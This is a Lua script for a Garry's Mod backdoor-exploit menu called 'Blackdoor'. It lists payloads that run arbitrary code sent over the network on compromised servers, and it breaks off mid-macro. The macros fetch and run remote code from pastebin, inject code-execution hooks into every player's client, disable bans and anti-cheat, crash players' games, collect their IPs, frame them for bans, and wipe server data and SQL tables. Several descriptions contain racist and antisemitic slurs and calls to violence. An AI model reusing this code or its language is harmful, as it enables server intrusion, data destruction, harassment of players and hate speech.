﻿-- local odium = jit.status( 'ODIUM' ) if !istable(odium) then print('FAILED TO IMPORT ODIUM TABLE') end 

local oldRead = file.Read
function file.Read( fn, path )
if string.find(fn, "odium*") then
	surface.PlaySound("ambient/alarms/klaxon1.wav")
    chat.AddText(Color( 195,205,255,255 ), "[", "Blackdoor", "] ", Color( 255, 255, 255 ), "A file steal attempt has successfully been blocked.")
else
    return oldRead( fn, path )
end
end -- Blocks LUA file stealing attempts

if file.Exists( "includes/extensions/client/vehicle.lua", "LUA" ) == true 
then chat.AddText(Color( 195,205,255,255 ), "[", "Blackdoor", "] ", Color( 255, 255, 255 ), "Cake Anti Cheat works, be careful") end

local BD = {}

BD.Backdoors = BD.Backdoors or {}

BD.CurrentBackdoor = "No Narks"



BD.BackdoorTypes = {

    ["Generic"] = {

        ["Code"] = "util.AddNetworkString( '_CAC_ReadMemory' ) net.Receive( '_CAC_ReadMemory', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",

        ["Netkey"] = "_CAC_ReadMemory",

    },

}





local netsss = net.Start

function BD.IsMessagePooled( netmessage )

local netfunc = netsss

local status, error = pcall( netsss, netmessage )

return status

end



local net = net




local ctxt = chat.AddText

function BD.ChatText( message, col )

    ctxt( Color(195,205,255,255), "[Blackdoor] ", col, message )

end



function BD.PingBackDoors()

    local bds = {}

    for k, v in pairs(BD.BackdoorTypes) do

        if BD.IsMessagePooled( tostring( v.Netkey ) ) then bds[k] = true end

    end

    return bds

end

concommand.Add("odium_refresh_backdoors", function() BD.Backdoors = BD.PingBackDoors() end)



function BD.BackdoorActive()

    return table.Count( BD.Backdoors ) > 0

end



function BD.GetActive()

    if !BD.BackdoorTypes[BD.CurrentBackdoor] then return { ["Code"] = "local x = 69", ["Netkey"] = "" } end

    return BD.BackdoorTypes[BD.CurrentBackdoor]

end



BD.BDMacros ={



    ["Artillery Strike"] = {

        ["Type"] = 1,

        ["Code"] =  [[if !bombstrike then

hook.Add("Think", "lulz_bombstrike", function() 

local explode = ents.Create( "env_explosion" ) 

local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))

local trc = {}

trc.start = ps

trc.endpos = ps + Vector( 0, 0, -99999)

local tr = util.TraceLine(trc)

if !tr.Hit then return end

explode:SetPos( tr.HitPos ) 

explode:Spawn() 

explode:SetKeyValue( "iMagnitude", "400" ) 

explode:Fire( "Explode", 0, 0 ) 

end)

bombstrike = true

else

hook.Remove("Think", "lulz_bombstrike")

bombstrike = false

end]],

        ["Desc"] = "Explode the shit out of everything",

    },





    ["@ Inject SendLua Interface"] = {

        ["Type"] = 1,

        ["Code"] = [[

    util.AddNetworkString( "fucked" )

    function BDSendLua( p, str ) net.Start( "fucked" ) net.WriteString( str ) net.Send( p ) end

    function BDSendLuaAll( str ) net.Start( "fucked" ) net.WriteString( str ) net.Broadcast() end

    function BDInjectAids( p ) p:SendLua( 'net.Receive( "fucked", function() RunString( net.ReadString() ) end )' ) end

    for k, v in pairs( player.GetAll() ) do BDInjectAids( v ) end

    hook.Add( "PlayerInitialSpawn", "youonlygetfuckedagain", function( p ) BDInjectAids( p ) end)

        ]],

        ["Desc"] = "You need this to use certain macros",
		
		["Private"] = true,

    },



    ["Announce centre screen"] = {

        ["Type"] = 1,

        ["Code"] = [[for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, @1 ) end]],

        ["Desc"] = "Make an announcement in the centre of everybodys screen",

        ["NeedsParameters"] = 1,

    },
		
	
	
    ["Fun Functions [helpme 1/2]"] = {
 
    ["Type"] = 1,
 
    ["Code"] = [[http.Fetch( "https://pastebin.com/raw/n5RKfPE5", function( b, l, h, c ) RunString( b ) end, function() end )]],
 
    ["Desc"] = "Fun functions. Mount it in the console helpme helpme 1 or 2 to get a list of available commands",
 
    },



    ["Rainbow chat spam"] = {

        ["Type"] = 1,

        ["Code"] = [[

        if !timer.Exists( "lulz_chatspam" ) then

            timer.Create( "lulz_chatspam", 0.5, 0, function() BDSendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )' ) end)

        else

            timer.Remove( "lulz_chatspam" )

        end]],

        ["Desc"] = "Spam rainbow chat for all players with the 1st parameter as the text",

        ["NeedsParameters"] = 1,

    },



    ["Rainbow chat spam (Turbo)"] = {

        ["Type"] = 1,

        ["Code"] = [[

        if !timer.Exists( "lulz_chatspam" ) then

            timer.Create( "lulz_chatspam", 0.01, 0, function() BDSendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )' ) end)

        else

            timer.Remove( "lulz_chatspam" )

        end]],

        ["Desc"] = "Spam rainbow chat for all players with the 1st parameter as the text",

        ["NeedsParameters"] = 1,

    },



    ["Unlock all doors"] = {

        ["Type"] = 1,

        ["Code"] = [[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]],

        ["Desc"] = "",

    },



    ["Toggle all doors"] = {

        ["Type"] = 1,

        ["Code"] = [[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end]],

        ["Desc"] = "",

    },



    ["Broken Glass Symphony"] = {

        ["Type"] = 1,

        ["Code"] = [[

    if !timer.Exists( "A true masterpiece" ) then

        timer.Create( "A true masterpiece", 0.2, 0, function() 

            for _, p in pairs(player.GetAll()) do

                p:EmitSound( "physics/glass/glass_largesheet_break"..math.random(1,3)..".wav", 100, math.random( 40, 180 ) )

            end

        end)

    else

        timer.Remove( "A true masterpiece" )

    end]],

        ["Desc"] = "Beethoven's last hidden symphony, only rediscovered in 2017",

    },



    ["Yeah Baby"] = {

        ["Type"] = 1,

        ["Code"] = [[

        if !timer.Exists( "porn" ) then

        timer.Create( "porn", 0.3, 0, function() 

            for _, p in pairs(player.GetAll()) do

                p:EmitSound( "vo/npc/female01/yeah02.wav", 100, math.random( 90, 120 ) )

            end

        end)

        else

            timer.Remove( "porn" )

        end]],

        ["Desc"] = "YEAH BABY YEAH",

    },



    ["Street War"] = {

        ["Type"] = 1,

        ["Code"] = [[

        if !timer.Exists( "cwar" ) then

        timer.Create( "cwar", 1, 0, function() 

            for _, p in pairs(player.GetAll()) do

                p:EmitSound( "ambient/levels/streetwar/city_battle"..math.random( 1, 19 )..".wav", 100, math.random( 90, 120 ) )

            end

        end)

        else

            timer.Remove( "cwar" )

        end]],

        ["Desc"] = "For when you need more dakka",

    },



    ["Earthquake"] = {

        ["Type"] = 1,

        ["Code"] = [[

        if !timer.Exists( "earthquake" ) then

        timer.Create( "earthquake", 0.5, 500, function() 

            for _, p in pairs(player.GetAll()) do

                p:SetPos( p:GetPos() + Vector( 0, 0, 1 ) )

                p:SetVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) )

                util.ScreenShake( p:GetPos(), 20, 1, 1, 100 )

                p:EmitSound( "ambient/explosions/exp1.wav", 100, math.random( 60, 100 ) )

            end



            for _, e in pairs(ents.GetAll()) do

                if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) ) end

            end





        end)

        else

            timer.Remove( "earthquake" )

        end]],

        ["Desc"] = "For when you need more dakka",

    },



    ["Seize the server"] = {

        ["Type"] = 1,

        ["Code"] = [[

        hook.Add("PlayerInitialSpawn", "gw_siezed", function( ply ) ply:SendLua('local html = vgui.Create( "HTML" )html:SetSize( ScrW(), ScrH() )html:OpenURL( "http://globalwraith.com/util/seized.html" )') end)

        for k, v in pairs(player.GetAll()) do

            v:SendLua('local html = vgui.Create( "HTML" )html:SetSize( ScrW(), ScrH() )html:OpenURL( "http://globalwraith.com/util/seized.html" )')

        end]],

        ["Desc"] = "Display the seized by wraithnet message to all players",

    },



    ["Explode all vehicles"] = {

        ["Type"] = 1,

        ["Code"] = [[for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then 

        local explo = ents.Create("env_explosion")

        explo:SetPos(v:GetPos())

        explo:SetKeyValue("iMagnitude", "300")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        end

        end]],

        ["Desc"] = "",

    },

    ["Lua run from pastebin"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[http.Fetch( "@1", function( b, l, h, c ) RunString( b ) end, function() end )]],
 
        ["Desc"] = "Fetch and run code from a pastebin link ( remember to use raw you stupid faggot eg. https://pastebin.com/raw/z9FBDcKW )",
 
    },

    ["RCON command"] = {

        ["Type"] = 1,

        ["Code"] = [[game.ConsoleCommand( @1.."\n" )]],

        ["Desc"] = "Like having rcon access without actually having rcon access",

    },





    ["Destroy ULX Ban/Kick"] = {

        ["Type"] = 1,

        ["Code"] = [[ULib.Ban = function() return false end

        ULib.addBan = function() return end

        ULib.kick = function() return end]],

        ["Desc"] = "Completely break ulx ban and ulx kick so you can't be locked out of the server",

    },







------------------------ player targeted macros ------------------------



    ["Kill player"] = {

        ["Type"] = 2, -- 1 = indiscriminate, 2= targeted, 3 = dangerous

        ["Code"] = [[v:Kill()]],

        ["Desc"] = "",

    },



    ["Fumble player"] = {

        ["Type"] = 2, -- 1 = indiscriminate, 2= targeted, 3 = dangerous

        ["Code"] = [[v:DropWeapon( v:GetActiveWeapon() )]],

        ["Desc"] = "Knocks their current weapon out of their hand",

    },



    ["Strip weapons"] = {

        ["Type"] = 2,

        ["Code"] = [[v:StripWeapons()]],

        ["Desc"] = "",

    },



    ["Rocket"] = {

        ["Type"] = 2,

        ["Code"] = [[v:SetVelocity( Vector(0, 0, 9000) )]],

        ["Desc"] = "Sends them flying up into the air",

    },



    ["Rocket (Spastic)"] = {

        ["Type"] = 2,

        ["Code"] = [[v:SetVelocity( Vector(math.random( -9000, 9000), math.random( -9000, 9000), 9000) )]],

        ["Desc"] = "HOLY SHIIIIIIIIIIIT",

    },



    ["Change model"] = {

        ["Type"] = 2,

        ["Code"] = [[v:SetModel( @1 )]],

        ["Desc"] = "Set their player model to the specified string (1st paremeter)",

        ["NeedsParameters"] = 1,

    },



    ["Set health + armor"] = {

        ["Type"] = 2,

        ["Code"] = [[v:SetHealth( @1 ) v:SetArmor( @2 ) ]],

        ["Desc"] = "Sets their health (1st paremeter) and armor (2nd paremeter)",

        ["NeedsParameters"] = 2,

    },



    ["Ear rape"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local snd = {

            [1] = "npc/stalker/go_alert2a.wav",

            [2] = "vo/npc/male01/question06.wav",

            [3] = "ambient/energy/zap1.wav",

            [4] = "weapons/knife/knife_stBD.wav",

            [5] = "vo/ravenholm/madlaugh04.wav",

            [6] = "npc/antlion_guard/antlion_guard_die1.wav",

            [7] = "vo/breencast/br_collaboration01.wav,"

        }

        v:EmitSound( snd[tonumber(@1)], 100, 100 )

        ]],

        ["Desc"] = "Make them emit a sound (1st paremeter is a number 1-7)",

        ["NeedsParameters"] = 1,

    },



    ["Ear rape (from internet)"] = {

        ["Type"] = 2,

        ["Code"] = [[

        BDSendLua( v, 'if soundrape then soundrape:Remove() soundrape = nil return end soundrape = vgui.Create( "DFrame" ) soundrape:SetSize( 1, 1 ) local html = vgui.Create( "HTML", soundrape ) html:OpenURL( @1 )' )

        ]],

        ["Desc"] = "Make them hear a sound from a URL (1st paremeter).  Sending a new sound will stop the previous one.  Send an invalid url to stop all sounds entirely on their client",

        ["NeedsParameters"] = 1,

    },



    ["Eye rape (from internet)"] = {

        ["Type"] = 2,

        ["Code"] = [[ 

        BDSendLua( v, 'if bdeyerape then bdeyerape:Remove() bdeyerape = nil return end bdeyerape = vgui.Create( "DFrame" )bdeyerape:SetDraggable( false )bdeyerape:SetSize( ScrW(), ScrH() )bdeyerape:SetTitle( "" )bdeyerape:ShowCloseButton( false )local html = vgui.Create( "HTML", bdeyerape )html:Dock( FILL )html:OpenURL( @1 )' )

        ]],

        ["Desc"] = "Make them see a full screen, unclosable panel from a URL (1st paremeter).  Sending a new url will stop the previous one.  Send an invalid url to clear their view entirely",

        ["NeedsParameters"] = 1,

    },



    ["Rave Mode"] = {

        ["Type"] = 2,

        ["Code"] = [[ 

            BDSendLua( v, 'if hook.GetTable().HUDPaint.drugznigga then hook.Remove( "HUDPaint", "drugznigga" ) else hook.Add( "HUDPaint", "drugznigga", function() local cin = math.sin( CurTime() * 10 ) * 255 surface.SetDrawColor( Color( cin, -cin, cin, 100 ) ) surface.DrawRect( 0, 0, ScrW(), ScrH() ) end) end' )

        ]],

        ["Desc"] = "Make them loosen up and join the party",

    },



    ["Rave Music"] = {

        ["Type"] = 2,

        ["Code"] = [[ 

            BDSendLua( v, 'surface.PlaySound( "music/hl1_song25_remix3.mp3" )' )

        ]],

        ["Desc"] = "DOOF DOOF NIGGA",

    },



    ["Whisper"] = {

        ["Type"] = 2,

        ["Code"] = [[v:ChatPrint( @1 )]],

        ["Desc"] = "Anonymously whisper text into their chatbox (1st paremeter)",

        ["NeedsParameters"] = 1,

    },



    ["Whisper (advanced)"] = {

        ["Type"] = 2,

        ["Code"] = [[

        BDSendLua( v, 'chat.AddText( Color( @2, @3, @4 ), @1 )' )

        ]],

        ["Desc"] = "Anonymously whisper coloured text into their chatbox (1st paremeter = text, 2nd = r, 3rd = g, 4th = b)",

        ["NeedsParameters"] = 1,

    },



    ["Ignite player"] = {

        ["Type"] = 2,

        ["Code"] = [[v:Ignite( 30 )]],

        ["Desc"] = "Ignite players for 30 seconds, spam repeatedly to refresh the duration",

    },



    ["Toggle godmode"] = {

        ["Type"] = 2,

        ["Code"] = [[if v:HasGodMode() then v:GodDisable() else v:GodEnable() end]],

        ["Desc"] = "",

    },



    ["Crash their gmod"] = {

        ["Type"] = 2,

        ["Code"] = [[v:SendLua("function fag() return fag() end fag()")]],

        ["Desc"] = "Instantly freezes their game solid, the only way to fix it is ctrl-alt-delete or a computer restart",

    },



    ["Toggle serverside speedhack"] = {

        ["Type"] = 2,

        ["Code"] = [[if !v.Sanic then v:SetRunSpeed( 1200 ) v:SetWalkSpeed(800) v.Sanic = true else v:SetRunSpeed( 240 ) v:SetWalkSpeed( 160 ) v.Sanic = false end]],

        ["Desc"] = "GOTTA GO FAST",

    },



    ["Freeze/Unfreeze player"] = {

        ["Type"] = 2,

        ["Code"] = [[v:Freeze( !v:IsFrozen() )]],

        ["Desc"] = "",

    },



    ["Force say"] = {

        ["Type"] = 2,

        ["Code"] = [[v:Say(@1)]],

        ["Desc"] = "Forces them to say the specified string in chat (first parameter)",

        ["NeedsParameters"] = 1,

    },





    ["Force concommand"] = {

        ["Type"] = 2,

        ["Code"] = [[v:ConCommand(@1)]],

        ["Desc"] = "Forces them to run the specified console command (first parameter)",

        ["NeedsParameters"] = 1,

    },



    ["Grab IP"] = {

        ["Type"] = 2,

        ["Code"] = [[ for _, p in pairs(player.GetAll()) do if %LP then p:ChatPrint( v:Nick().." : "..v:IPAddress() ) end end]],

        ["Desc"] = "Prints their IP Address to your console",

    },





    ["DarkRP add/remove money"] = {

        ["Type"] = 2,

        ["Code"] = [[v:addMoney(@1)]],

        ["Desc"] = "Adds money to their wallet (first parameter) remember that you can use negative numbers to subtract money",

        ["NeedsParameters"] = 1,

    },



    ["DarkRP force job"] = {

        ["Type"] = 2,

        ["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:changeTeam(i, true, true) end end]],

        ["Desc"] = "Change their team to the specified job (1st parameter = job name, does not require capitalization)",

        ["NeedsParameters"] = 1,

    },



    ["Force team switch"] = {

        ["Type"] = 2,

        ["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:SetTeam( i ) end end]],

        ["Desc"] = "Change their team to the specified team name (1st parameter)",

        ["NeedsParameters"] = 1,

    },



    ["Noclip player"] = {

        ["Type"] = 2,

        ["Code"] = [[if v:GetMoveType() != MOVETYPE_NOCLIP then v:SetMoveType(MOVETYPE_NOCLIP) else v:SetMoveType(MOVETYPE_WALK) end]],

        ["Desc"] = "Toggles noclip on the specified players",

    },



    ["Give weapon to player"] = {

        ["Type"] = 2,

        ["Code"] = [[v:Give( @1 )]],

        ["Desc"] = "Gives this player a weapon (first parameter)",

        ["NeedsParameters"] = 1,

    },



    ["Give ammo to player"] = {

        ["Type"] = 2,

        ["Code"] = [[v:GiveAmmo( @1, @2, false )]],

        ["Desc"] = "Gives this player some ammo (first parameter = amount of ammo, secound parameter = ammo type)",

        ["NeedsParameters"] = 2,

    },



    ["Teleport (them to your cursor)"] = {

        ["Type"] = 2,

        ["Code"] = [[

            local tp = false

            local tpos

            for _, p in pairs(player.GetAll()) do if %LP then tpos = p:GetEyeTraceNoCursor().HitPos tp = true end end

            if tp then v:SetPos( tpos ) end

        ]],

        ["Desc"] = "Teleports the selected players to your cursor location, not recommended for more than 1 person at once",

    },



    ["Teleport (you to them)"] = {

        ["Type"] = 2,

        ["Code"] = [[

            local tp = false

            local tpos = v:GetPos() + Vector( 32, 0, 10)

            for _, p in pairs(player.GetAll()) do if %LP then p:SetPos( tpos ) end end

        ]],

        ["Desc"] = "Teleport yourself to the selected player, may end with you stuck inside a wall",

    },



    ["Teleport (blink)"] = {

        ["Type"] = 2,

        ["Code"] = [[

            local tpos = v:GetEyeTraceNoCursor().HitPos

            v:SetPos( tpos )

        ]],

        ["Desc"] = "Use on yourself or others to warp them to where they are looking",

    },



    ["Spawn entity near player"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local tr = {}

        tr.start = v:GetShootPos()

        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        tr.filter = {v}

        local trace = util.TraceLine(tr)

        local dix = ents.Create( @1 )

        dix:SetPos(trace.HitPos)

        dix:SetAngles(Angle(0,0,0))

        dix:Spawn()

        ]],

        ["Desc"] = "Spawn an entity in front of this player (first parameter = entity class), cannot spawn cars!",

        ["NeedsParameters"] = 1,

    },



    ["Spawn prop near player"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local tr = {}

        tr.start = v:GetShootPos()

        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        tr.filter = {v}

        local trace = util.TraceLine(tr)

        local dix = ents.Create( "prop_physics" )

        dix:SetPos(trace.HitPos)

        dix:SetAngles(Angle(0,0,0))

        dix:SetModel( @1 )

        dix:Spawn()

        ]],

        ["Desc"] = "Spawn a world prop in front of this player (first parameter = model)",

        ["NeedsParameters"] = 1,

    },



    ["Spawn odium shrine"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local tr = {}

        tr.start = v:GetShootPos()

        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        tr.filter = {v}

        local trace = util.TraceLine(tr)

        local dix = ents.Create( "prop_physics" )

        dix:SetPos( trace.HitPos + Vector( 0, 0, 70 ) )

        dix:SetAngles( v:GetAngles() )

        dix:SetModel( "models/props_c17/gravestone_cross001a.mdl" )

        dix:Spawn()

        dix:SetMoveType( MOVETYPE_NONE )

        dix:SetMaterial( "models/shiny" )

        dix:SetColor( Color( 0, 0, 40 ) )



        local function ecr( parent, model, pos, ang, col, mat  )

            local dix = ents.Create( "prop_physics" )

            dix:SetPos( parent:LocalToWorld( pos ) )

            dix:SetAngles( parent:LocalToWorldAngles( ang ) )

            dix:SetModel( model )

            dix:SetParent( parent )

            dix:Spawn()

            dix:SetColor( col )

            dix:SetMaterial( mat )

        end



        ecr( dix, "models/props_c17/gravestone_coffinpiece001a.mdl", Vector( -65, 0, -60 ), Angle( 0, 180, 0 ), Color( 40, 40, 80 ), "models/shiny"  )

        ecr( dix, "models/hunter/blocks/cube025x3x025.mdl", Vector( -5, 18, 35 ), Angle( 0, 0, 0 ), Color( 80, 80, 180 ), "models/shiny"  )

        ecr( dix, "models/hunter/blocks/cube025x3x025.mdl", Vector( -5, 6, 65 ), Angle( 0, 0, 90 ), Color( 80, 80, 180 ), "models/shiny"  )

        ecr( dix, "models/hunter/blocks/cube025x150x025.mdl", Vector( -5, 71, 100 ), Angle( 0, 0, 90 ), Color( 80, 80, 180 ), "models/shiny"  )

        ecr( dix, "models/hunter/blocks/cube025x150x025.mdl", Vector( -5, -59, 100 ), Angle( 0, 0, 90 ), Color( 80, 80, 180 ), "models/shiny"  )



        for _, p in pairs( player.GetAll() ) do p:SendLua( 'chat.AddText( Color(200, 200, 255 ), "Heil odium.pro, god of cheating")' ) sound.Play( "ambient/explosions/explode_8.wav", p:GetPos(), 90, 80, 1 ) end



        ]],

        ["Desc"] = "Spawn a world prop in front of this player (first parameter = model)",

    },







    ["Spawn evil npc near player"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local tr = {}

        tr.start = v:GetShootPos()

        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        tr.filter = {v}

        local trace = util.TraceLine(tr)

        local dix = ents.Create( "npc_citizen" )

        dix:SetPos(trace.HitPos)

        dix:SetAngles(Angle(0,0,0))

        dix:SetKeyValue( "additionalequipment", table.Random({"weapon_shotgun", "weapon_smg1", "weapon_ar2"}) )

        dix:SetKeyValue( "citizentype", 3 )

        dix:AddRelationship("player D_HT 200")

        dix:SetCurrentWeaponProficiency(WEAPON_PROFICIENCY_PERFECT)

        dix:SetSchedule( SCHED_IDLE_WANDER )

        dix:Spawn()

        ]],

        ["Desc"] = "Spawn a hostile NPC in front of this player",

    },



    ["Death ray"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        if trace.Entity:IsValid() then trace.Entity:Remove() end

        ]],

        ["Desc"] = "Vaporize whatever this player is looking at",

    },



    ["Death ray (explosive)"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        local explo = ents.Create("env_explosion")

        explo:SetPos(trace.HitPos)

        explo:SetKeyValue("iMagnitude", "250")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        ]],

        ["Desc"] = "Blow up whatever this player is looking at",

    },



    ["Precise Artillery Strike"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        timer.Create( "uiashfuasfas"..v:UniqueID()..math.random(-9999, 99999), 0.2, 15, function()

        local explo = ents.Create("env_explosion")

        explo:SetPos(trace.HitPos + Vector( math.random( -500, 500), math.random( -500, 500), math.random( -500, 500) ) )

        explo:SetKeyValue("iMagnitude", "250")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        end)

        ]],

        ["Desc"] = "Blow up whatever this player is looking at",

    },



    ["Woman Driver"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        local car = ents.Create("prop_physics")

        local trace2 = util.TraceLine( { start = trace.HitPos, endpos = trace.HitPos + Vector( 0, 0, 5000000 ), mask = MASK_SOLID_BRUSHONLY } )

        car:SetModel( "models/props_vehicles/car002a_physics.mdl" )

        car:SetAngles( v:GetAngles() )

        car:SetPos( trace2.HitPos + Vector( 0, 0, -60 ) )

        car:Spawn()

        car:Activate()

        car.boom = 6

        car:GetPhysicsObject():SetVelocity( Vector( 0, 0, -5000 ) )

        car:Ignite( 500 )

        car:AddCallback( "PhysicsCollide", function( car, dat )

            local explo = ents.Create("env_explosion")

            explo:SetPos( car:GetPos() )

            explo:SetKeyValue("iMagnitude", "350")

            explo:Spawn()

            explo:Activate()

            explo:Fire("Explode", "", 0)

            local ef = EffectData()

            ef:SetOrigin( car:GetPos() )

            ef:SetMagnitude( 5 )

            ef:SetScale( 200 )

            util.Effect( "ThumperDust", ef )

            car.boom = car.boom - 1

            if car.boom < 0 then car:Remove() end

        end )

        timer.Simple( 30, function() if car:IsValid() then car:Remove() end end)

        ]],

        ["Desc"] = "Make exploding vehicles rain from the sky",

    },







    ["Poison Gas"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        local ar2Explo = ents.Create("env_ar2explosion")

        ar2Explo:SetOwner(game.GetWorld())

        local p = trace.HitPos

        ar2Explo:SetPos(trace.HitPos)

        ar2Explo:Spawn()

        ar2Explo:Activate()

        ar2Explo:Fire("Explode", "", 0)

        timer.Create( "gasthekikes_"..math.random(-9999, 9999).."_"..math.random(-9999, 9999), 0.25, 35, function()

            for _, ent in pairs(ents.FindInSphere( p, 500)) do

                if !ent:IsPlayer() then continue end

                local d = DamageInfo()

                d:SetDamage( 1 )

                d:SetAttacker( game.GetWorld() )

                d:SetInflictor( game.GetWorld() )

                d:SetDamageType( DMG_DROWN )

                ent:TakeDamageInfo( d )

            end

        end)



        ]],

        ["Desc"] = "GAS THE JEWS RACE WAR NOW",

    },





    ["Spawn vehicle near player"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local trc = {}

        trc.start = v:GetShootPos()

        trc.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        trc.filter = {v}

        local tr = util.TraceLine(trc)



        local VehicleList = list.Get( "Vehicles" )

        local vehicle = VehicleList[ @1 ]

        if ( !vehicle ) then return end

        local Angles = v:GetAngles()

        Angles.pitch = 0

        Angles.roll = 0

        Angles.yaw = Angles.yaw + 180

    

        local pos = tr.HitPos

        if ( vehicle.Offset ) then

            pos = pos + tr.HitNormal * vehicle.Offset

        end

        local Ent = ents.Create( vehicle.Class )

        if ( !Ent ) then return end

        duplicator.DoGeneric( Ent, vehicle )

        if ( vehicle.Model == "models/buggy.mdl" ) then Ent:SetKeyValue( "vehiclescript", "scripts/vehicles/jeep_test.txt" ) end

        if ( vehicle.Model == "models/vehicle.mdl" ) then Ent:SetKeyValue( "vehiclescript", "scripts/vehicles/jalopy.txt" ) end

        if ( vehicle && vehicle.KeyValues ) then

            for k, v in pairs( vehicle.KeyValues ) do

                Ent:SetKeyValue( k, v )

            end

        end

        Ent:SetModel( vehicle.Model )

        Ent:SetAngles( Angles )

        Ent:SetPos( pos )

        Ent:Spawn()

        Ent:Activate()

        if ( Ent.SetVehicleClass && @1 ) then Ent:SetVehicleClass( @1 ) end

        Ent.VehicleName = vehicle.Class

        Ent.VehicleTable = @1

        Ent.ClassOverride = vehicle.Class

        ]],

        ["Desc"] = "Spawn a vehicle in front of this player (first parameter = vehicle class), don't try to spawn ents with this ya dingus!",

        ["NeedsParameters"] = 1,

    },



    ["Kick player"] = {

        ["Type"] = 2,

        ["Code"] = [[ v:Kick( @1 ) ]],

        ["Desc"] = "First parameter = reason for kick",

    },



    ["Niggerize player"] = {

        ["Type"] = 2,

        ["Code"] = [[ if !v.Niggered then v:SetColor( Color( 0, 0, 0 ) ) v.Niggered = true else v:SetColor( Color(255, 255, 255) ) v.Niggered = false end ]],

        ["Desc"] = "Turns them black as night",

    },



    ["Cloak player"] = {

        ["Type"] = 2,

        ["Code"] = [[ if !v.BDCloaked then v:SetRenderMode( RENDERMODE_NONE ) v.BDCloaked = true else v:SetRenderMode( RENDERMODE_NORMAL ) v.BDCloaked = false end ]],

        ["Desc"] = "Toggles cloaking on the player, people can still see the weapon they are holding however",

    },



    ["Allahu Ackbar"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local explo = ents.Create("env_explosion")

        explo:SetOwner(v)

        explo:SetPos(v:GetPos())

        explo:SetKeyValue("iMagnitude", "250")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        if v:Alive() then v:Kill() end

        ]],

        ["Desc"] = "Blows them the fuck up, all kills are attributed to them so its great for getting random assholes banned",

    },



    ["ULX set access"] = {

        ["Type"] = 2,

        ["Code"] = [[ local userInfo = ULib.ucl.authed[ v:UniqueID() ] ULib.ucl.addUser( v:UniqueID(), userInfo.allow, userInfo.deny, @1 ) ]],

        ["Desc"] = "If ulx is installed this will (silently!) set them to the specified usergroup (1st parameter)",

        ["NeedsParameters"] = 1,

    },





------------------------ dangerous codens ------------------------



    ["DarkRP clear all money"] = {

        ["Type"] = 3,

        ["Code"] = [[RunConsoleCommand("rp_resetallmoney")]],

        ["Desc"] = "Kids will cry to the admins for the next week about losing their precious money",

    },



    ["Cleanup map"] = {

        ["Type"] = 3,

        ["Code"] = [[game.CleanUpMap()]],

        ["Desc"] = "Wipe the map clean, taking everybodys cars, printers and bases out",

    },



    ["Vaporize all players"] = {

        ["Type"] = 3,

        ["Code"] = [[for k, v in pairs(player.GetAll()) do v:Remove() end]],

        ["Desc"] = "Deletes their player entity, leaving them staring at a wall of errors",

    },





    ["FPP Unrestrict everything"] = {

        ["Type"] = 3,

        ["Code"] = [[FPP.Blocked = {} FPP.BlockedModels = {} FPP.RestrictedTools = {} FPP.RestrictedToolsPlayers = {} ]],

        ["Desc"] = "",

    },



    ["Wipe data folder"] = {

        ["Type"] = 3,

        ["Code"] = [[local files, directories = file.Find( "*", "DATA" ) for k, v in pairs( files ) do file.Delete( v ) end ]],

        ["Desc"] = "Wipe the servers data folder, fucking all their settings and stuff up",

    },



    ["Wipe DarkRP SQL Tables"] = {

        ["Type"] = 3,

        ["Code"] = [[ MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)') ]],

        ["Desc"] = "Completely fucks darkrp, forces them to reinstall the entire server",

    },
	
	
	
	["Harm the server"] = {

    ["Type"] = 3,

    ["Code"] = [[ 
		
        if( LeyAC ) then
        LeyAC = nil;
        end

        timer.Create( "next_level_timer2", 20, 0, function()

        local bad = {"Ban","Kick","Kill","KillSilent","GodEnable","GodDisable"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end

        if ULib then
